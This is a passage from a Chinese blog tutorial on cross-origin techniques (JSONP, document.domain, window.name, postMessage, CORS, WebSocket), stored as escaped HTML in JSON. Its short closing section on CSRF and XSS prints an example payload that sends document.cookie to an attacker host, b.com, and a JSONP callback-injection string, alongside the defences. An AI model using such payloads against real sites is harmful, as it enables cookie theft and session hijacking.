<span class=\"string\">'jsonp'</span>,  <span class=\"comment\">// 请求方式为jsonp</span></span><br><span class=\"line\">    jsonpCallback: <span class=\"string\">\"back\"</span>,    <span class=\"comment\">// 自定义回调函数名</span></span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 需要回调执行函数</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">back</span>(<span class=\"params\">res</span>) </span>&#123;</span><br><span class=\"line\">    alert(<span class=\"built_in\">JSON</span>.stringify(res));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// 服务端返回</span></span><br><span class=\"line\">back(&#123;<span class=\"string\">\"status\"</span>: <span class=\"literal\">true</span>, <span class=\"string\">\"user\"</span>: <span class=\"string\">\"admin\"</span>&#125;)</span><br></pre></td></tr></table></figure>\n<h3 id=\"document-domain\"><a href=\"#document-domain\" class=\"headerlink\" title=\"document.domain\"></a>document.domain</h3><p>仅适用于主域相同，子域不同。可以共享Cookie。</p>\n<p><code>www.example.com/a.html</code> 和<code>child.example.com/b.html</code>相互之间的通信，两个页面都需要设置：<br><code>document.domain = &#39;example.com&#39;;</code></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 结合iframe实现更多跨域</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// www.example.com/a.html</span></span><br><span class=\"line\"><span class=\"built_in\">document</span>.domain = <span class=\"string\">'domain.com'</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> user = <span class=\"string\">'admin'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// child.example.com/b.html</span></span><br><span class=\"line\"><span class=\"built_in\">document</span>.domain = <span class=\"string\">'domain.com'</span>;</span><br><span class=\"line\">alert(<span class=\"string\">'父窗口变量user'</span> + <span class=\"built_in\">window</span>.parent.user);</span><br></pre></td></tr></table></figure>\n<h3 id=\"window-name\"><a href=\"#window-name\" class=\"headerlink\" title=\"window.name\"></a>window.name</h3><p>适用于iframe嵌套。</p>\n<p><code>window.name</code>是在同一个浏览器窗口下打开的所有页面共享的字段，最多可支持2MB。可以通过在<code>b.html</code>中设置<code>window.name</code>的值，在<code>a.html</code>中取出改值使用。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// www.domain1.com/a.html</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> proxy = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">url, callback</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> state = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> iframe = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">'iframe'</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 加载跨域页面</span></span><br><span class=\"line\">    iframe.src = url;</span><br><span class=\"line\">    <span class=\"comment\">// onload事件会触发2次，第1次加载跨域页，并留存数据于window.name</span></span><br><span class=\"line\">    iframe.onload = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (state === <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">            <span class=\"comment\">// 第2次onload(同域proxy页)成功后，读取同域window.name中数据</span></span><br><span class=\"line\">            callback(iframe.contentWindow.name);</span><br><span class=\"line\">            destoryFrame();</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (state === <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">            <span class=\"comment\">// 第1次onload(跨域页)成功后，切换到同域代理页面</span></span><br><span class=\"line\">            iframe.contentWindow.location = <span class=\"string\">'http://www.domain1.com/proxy.html'</span>;</span><br><span class=\"line\">            state = <span class=\"number\">1</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    <span class=\"built_in\">document</span>.body.appendChild(iframe);</span><br><span class=\"line\">    <span class=\"comment\">// 获取数据以后销毁这个iframe，释放内存；这也保证了安全（不被其他域frame js访问）</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">destoryFrame</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        iframe.contentWindow.document.write(<span class=\"string\">''</span>);</span><br><span class=\"line\">        iframe.contentWindow.close();</span><br><span class=\"line\">        <span class=\"built_in\">document</span>.body.removeChild(iframe);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"comment\">// 请求跨域b页面数据</span></span><br><span class=\"line\">proxy(<span class=\"string\">'http://www.domain2.com/b.html'</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">data</span>)</span>&#123;</span><br><span class=\"line\">    alert(data);</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// www.domain1.com/proxy.html</span></span><br><span class=\"line\">代理页面，内容为空即可。</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// www.domain2.com/b.html</span></span><br><span class=\"line\"> <span class=\"built_in\">window</span>.name = <span class=\"string\">'This is domain2 data!'</span>;</span><br></pre></td></tr></table></figure>\n<h3 id=\"window-postMessage\"><a href=\"#window-postMessage\" class=\"headerlink\" title=\"window.postMessage\"></a>window.postMessage</h3><p>postMessage是HTML5 XMLHttpRequest Level 2的新增API，下面为MDN给的示例。</p>\n<p><code>otherWindow.postMessage(message, targetOrigin, [transfer])</code></p>\n<ul>\n<li>otherWindow:其他窗口的一个引用，比如iframe的contentWindow属性、执行window.open返回的窗口对象、或者是命名过或数值索引的window.frames。</li>\n<li>message:将要发送到其他 window的数据。</li>\n<li>targetOrigin:通过窗口的origin属性来指定哪些窗口能接收到消息事件，其值可以是字符串”*”（表示无限制）或者一个URI。</li>\n<li>transfer:是一串和message 同时传递的 Transferable 对象. 这些对象的所有权将被转移给消息的接收方，而发送一方将不再保有所有权。</li>\n</ul>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!-- www.example1.com/a.html --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">iframe</span> <span class=\"attr\">id</span>=<span class=\"string\">\"iframe\"</span> <span class=\"attr\">src</span>=<span class=\"string\">\"http://www.example2.com/b.html\"</span> <span class=\"attr\">style</span>=<span class=\"string\">\"display:none;\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">iframe</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"keyword\">var</span> iframe = <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">'iframe'</span>);</span></span><br><span class=\"line\"><span class=\"javascript\">    iframe.onload = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">var</span> data = &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">            msg: <span class=\"string\">'1+1'</span>,</span></span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"comment\">// 传送跨域数据</span></span></span><br><span class=\"line\"><span class=\"javascript\">        iframe.contentWindow.postMessage(<span class=\"built_in\">JSON</span>.stringify(data), <span class=\"string\">'http://www.example2.com'</span>);</span></span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"comment\">// 接收example2数据</span></span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">receiveMessage</span>(<span class=\"params\">e</span>)</span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">if</span> (event.origin !== <span class=\"string\">\"http://www.example2.com\"</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">return</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">        alert(<span class=\"string\">'来自页面B:'</span> + e.data);</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"built_in\">window</span>.addEventListener(<span class=\"string\">'message'</span>, receiveMessage, <span class=\"literal\">false</span>);</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">&lt;!-- www.example2.com/b.html --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"comment\">//接收example1数据</span></span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">receiveMessage</span>(<span class=\"params\">e</span>)</span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">if</span> (event.origin !== <span class=\"string\">\"http://www.example1.com\"</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">return</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">        alert(<span class=\"string\">'来自页面A:'</span> + e.data);</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">var</span> data = <span class=\"built_in\">JSON</span>.parse(e.data);</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">if</span> (data) &#123;</span></span><br><span class=\"line\">            data.sum = 2;</span><br><span class=\"line\"><span class=\"javascript\">            <span class=\"comment\">// 处理后再发回example1</span></span></span><br><span class=\"line\"><span class=\"javascript\">            <span class=\"built_in\">window</span>.parent.postMessage(<span class=\"built_in\">JSON</span>.stringify(data), <span class=\"string\">'http://www.example1.com'</span>);</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"built_in\">window</span>.addEventListener(<span class=\"string\">'message'</span>, receiveMessage, <span class=\"literal\">false</span>);</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"CORS\"><a href=\"#CORS\" class=\"headerlink\" title=\"CORS\"></a>CORS</h3><p>CORS即跨域资源共享（Cross-origin resource sharing）。详细介绍可参考<a href=\"http://www.ruanyifeng.com/blog/2016/04/cors.html\" target=\"_blank\" rel=\"noopener\">跨域资源共享 CORS 详解</a>。</p>\n<p>普通的请求只需服务端设置Access-Control-Allow-Origin即可，前端无须设置。<br>带Cookie请求，前端常用设置：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/*  </span></span><br><span class=\"line\"><span class=\"comment\">  原生ajax</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> xhr = <span class=\"keyword\">new</span> XMLHttpRequest(); <span class=\"comment\">// IE8/9需用window.XDomainRequest兼容</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 前端设置是否带cookie</span></span><br><span class=\"line\">xhr.withCredentials = <span class=\"literal\">true</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">xhr.open(<span class=\"string\">'post'</span>, <span class=\"string\">'http://www.domain2.com:8080/login'</span>, <span class=\"literal\">true</span>);</span><br><span class=\"line\">xhr.setRequestHeader(<span class=\"string\">'Content-Type'</span>, <span class=\"string\">'application/x-www-form-urlencoded'</span>);</span><br><span class=\"line\">xhr.send(<span class=\"string\">'user=admin'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">xhr.onreadystatechange = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (xhr.readyState == <span class=\"number\">4</span> &amp;&amp; xhr.status == <span class=\"number\">200</span>) &#123;</span><br><span class=\"line\">        alert(xhr.responseText);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"comment\">/*  </span></span><br><span class=\"line\"><span class=\"comment\">  jquery</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br><span class=\"line\">$.ajax(&#123;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">   xhrFields: &#123;</span><br><span class=\"line\">       withCredentials: <span class=\"literal\">true</span>    <span class=\"comment\">// 前端设置是否带cookie</span></span><br><span class=\"line\">   &#125;,</span><br><span class=\"line\">   crossDomain: <span class=\"literal\">true</span>,   <span class=\"comment\">// 会让请求头中包含跨域的额外信息，但不会含cookie</span></span><br><span class=\"line\">    ...</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*  </span></span><br><span class=\"line\"><span class=\"comment\">  axios ==&gt;  withCredentials: true</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> axios <span class=\"keyword\">from</span> <span class=\"string\">'axios'</span></span><br><span class=\"line\"><span class=\"comment\">// 创建axios实例</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> service = axios.create(&#123;</span><br><span class=\"line\">  baseURL: process.env.BASE_API, <span class=\"comment\">// node环境的不同，对应不同的baseURL</span></span><br><span class=\"line\">  timeout: <span class=\"number\">5000</span>, <span class=\"comment\">// 请求的超时时间</span></span><br><span class=\"line\">  <span class=\"comment\">//设置默认请求头，使post请求发送的是formdata格式数据// axios的header默认的Content-Type好像是'application/json;charset=UTF-8',我的项目都是用json格式传输，如果需要更改的话，可以用这种方式修改</span></span><br><span class=\"line\">  <span class=\"comment\">// headers: &#123;  </span></span><br><span class=\"line\">    <span class=\"comment\">// \"Content-Type\": \"application/x-www-form-urlencoded\"</span></span><br><span class=\"line\">  <span class=\"comment\">// &#125;,</span></span><br><span class=\"line\">  withCredentials: <span class=\"literal\">true</span> <span class=\"comment\">// 允许携带cookie</span></span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// node后台</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> express = <span class=\"built_in\">require</span>(<span class=\"string\">'express'</span>)</span><br><span class=\"line\"><span class=\"keyword\">const</span> app = express()</span><br><span class=\"line\"><span class=\"keyword\">const</span> cors = <span class=\"built_in\">require</span>(<span class=\"string\">'cors'</span>) <span class=\"comment\">// 此处我的项目中使用express框架，跨域使用了cors npm插件</span></span><br><span class=\"line\"></span><br><span class=\"line\">app.use(cors&#123;</span><br><span class=\"line\">    credentials: <span class=\"literal\">true</span>,</span><br><span class=\"line\">    origin: <span class=\"string\">'http://localhost:8081'</span>, <span class=\"comment\">// web前端服务器地址</span></span><br><span class=\"line\">    <span class=\"comment\">// origin: '*' // 这样会出错</span></span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n<h3 id=\"WebSocket\"><a href=\"#WebSocket\" class=\"headerlink\" title=\"WebSocket\"></a>WebSocket</h3><p>只要服务端支持就可以使用。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// express</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> app = <span class=\"built_in\">require</span>(<span class=\"string\">'express'</span>)();</span><br><span class=\"line\"><span class=\"keyword\">var</span> server = <span class=\"built_in\">require</span>(<span class=\"string\">'http'</span>).Server(app);</span><br><span class=\"line\"><span class=\"keyword\">var</span> io = <span class=\"built_in\">require</span>(<span class=\"string\">'socket.io'</span>)(server);</span><br><span class=\"line\"></span><br><span class=\"line\">server.listen(<span class=\"number\">80</span>);</span><br><span class=\"line\"><span class=\"comment\">// WARNING: app.listen(80) will NOT work here!</span></span><br><span class=\"line\"></span><br><span class=\"line\">app.get(<span class=\"string\">'/'</span>, <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">req, res</span>) </span>&#123;</span><br><span class=\"line\">  res.sendfile(__dirname + <span class=\"string\">'/index.html'</span>);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">io.on(<span class=\"string\">'connection'</span>, <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">socket</span>) </span>&#123;</span><br><span class=\"line\">  socket.emit(<span class=\"string\">'news'</span>, &#123; <span class=\"attr\">hello</span>: <span class=\"string\">'world'</span> &#125;);</span><br><span class=\"line\">  socket.on(<span class=\"string\">'my other event'</span>, <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">data</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(data);</span><br><span class=\"line\">  &#125;);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// index.html</span></span><br><span class=\"line\">&lt;script src=<span class=\"string\">\"/socket.io/socket.io.js\"</span>&gt;<span class=\"xml\"><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span></span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> socket = io.connect(<span class=\"string\">'http://localhost'</span>);</span><br><span class=\"line\">  socket.on(<span class=\"string\">'news'</span>, <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">data</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(data);</span><br><span class=\"line\">    socket.emit(<span class=\"string\">'my other event'</span>, &#123; <span class=\"attr\">my</span>: <span class=\"string\">'data'</span> &#125;);</span><br><span class=\"line\">  &#125;);</span><br><span class=\"line\">&lt;<span class=\"regexp\">/script&gt;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"跨域攻击\"><a href=\"#跨域攻击\" class=\"headerlink\" title=\"跨域攻击\"></a>跨域攻击</h2><h3 id=\"CSRF-XSRF攻击\"><a href=\"#CSRF-XSRF攻击\" class=\"headerlink\" title=\"CSRF/XSRF攻击\"></a>CSRF/XSRF攻击</h3><p>示例如下，防止CSRF攻击的方法是<code>referer过滤校验+token验证</code>，即服务端检测JSON文件调用来源和检查token数据是否匹配。</p>\n<p><img src=\"../images/ajax_articlex.png\" alt=\"CSRF/XSRF\"></p>\n<h3 id=\"XSS攻击\"><a href=\"#XSS攻击\" class=\"headerlink\" title=\"XSS攻击\"></a>XSS攻击</h3><p>提交含有恶意脚本的数据到服务器，从而达到破坏页面甚至盗取cookie伪装登录等目的。<br>例如，在<code>a.com/index.ftl</code>中有如下代码：<code>欢迎你，${username}</code>，这时恶意网站<code>b.com</code>传递参数：<br><code>username=&lt;script&gt;window.open(“www.b.com?param=”+document.cookie)&lt;/script&gt;</code><br>这样就轻而易举地盗取了用户的cookie值了。<br>在jsonp跨域访问中，xss注入主要是callback参数注入，如：<br><code>&lt;script src=&quot;http://www.a.com/getData.do?callback=&lt;script&gt;alert(&#39;xss&#39;);&lt;/script&gt;&quot;&gt;&lt;/script&gt;</code><br>防止措施是对参数进行校验过滤。</p>\n<p>参考链接<br><a href=\"https://segmentfault.com/a/1190000003784372\" target=\"_blank\" rel=\"noopener\">https://segmentfault.com/a/1190000003784372</a><br><a href=\"https://www.cnblogs.com/roam/p/7520433.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/roam/p/7520433.html</a></p>","categories":[{"name":"ajax","path":"api/categories/ajax.json"}],"tags":[{"name":"http","path":"api/tags/http.json"},{"name":"跨域","path":"api/tags/跨域.json"}]}